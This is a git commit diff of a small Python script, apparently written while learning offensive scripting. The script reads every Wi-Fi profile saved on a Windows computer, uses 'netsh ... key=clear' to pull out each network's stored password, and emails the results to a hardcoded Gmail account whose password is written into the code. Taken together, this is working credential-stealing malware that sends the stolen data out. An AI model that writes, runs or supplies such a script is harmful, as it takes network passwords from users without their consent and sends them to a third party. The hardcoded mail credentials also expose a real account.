e41eb7ca40c36e3270cba43c0048d058eafd5050
Mário Gil <mg_mesquita@hotmail.com>
2018-07-30 10:20:06 +0100

    Retrieving information from all networks the computer has connected

--- execute_command.py
+++ execute_command.py
@@ -1,6 +1,6 @@
 #!/usr/bin/env python
 
-import subprocess, smtplib
+import subprocess, smtplib, re
 
 
 def send_mail(email, password, message):
@@ -11,6 +11,14 @@ def send_mail(email, password, message):
     server.quit()
 
 
-command = 'netsh wlan show profile "Home Network" key=clear'
-result = subprocess.check_output(command, shell=True)
+command = 'netsh wlan show profile'
+networks = subprocess.check_output(command, shell=True)
+network_names_list = re.findall("(?:Profile\s*:\s)(.*)", networks)
+
+result = ""
+for network_name in network_names_list:
+    command = 'netsh wlan show profile "' + network_name + '" key=clear'
+    current_result = subprocess.check_output(command, shell=True)
+    result += current_result
+
 send_mail("yelp.camp.mailer.123@gmail.com", "yelp.camp", result)
